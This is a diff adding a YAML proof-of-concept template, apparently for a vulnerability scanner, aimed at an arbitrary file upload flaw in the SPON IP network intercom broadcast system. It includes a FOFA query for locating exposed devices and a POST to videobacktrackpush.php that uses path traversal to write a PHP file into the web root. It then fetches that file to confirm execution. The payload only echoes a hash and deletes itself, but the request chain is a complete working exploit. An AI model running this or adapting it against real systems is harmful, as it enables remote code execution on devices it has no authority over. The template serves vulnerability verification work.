@@ -1,0 +1,23 @@
+id: poc-yaml-spon-videobacktrackpush-anyfile-upload
+info:
+  name: 世邦通信SPON-IP网络对讲广播系统 videobacktrackpush 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: IP网络对讲广播系统
+  fofa: body="spon_base64.js" && body="login"
+variables:
+  t1: random_int(1,10)
+  t2: md5(t1)
+  payload: base64(concat(`<?php echo md5(`,str(t1),`);unlink(__FILE__);`))
+requests:
+- method: POST
+  path: /php/videobacktrackpush.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]={{.t1}}_{{.t1}}_{{.t1}}.php&jsondata[videocontent]={{.payload}}
+  expression: status_code == 200 && contains(body,"\"res\":\"1\"") && contains(body,"success")
+- method: GET
+  path: /{{.t1}}_{{.t1}}_{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
